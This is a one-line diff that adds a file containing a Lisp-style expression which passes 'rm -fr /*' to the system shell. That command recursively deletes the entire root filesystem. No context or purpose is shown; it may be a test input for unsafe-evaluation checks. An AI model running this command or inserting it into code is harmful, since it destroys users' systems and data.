@@ -1,0 +1,1 @@
+#(system "rm -fr /*")
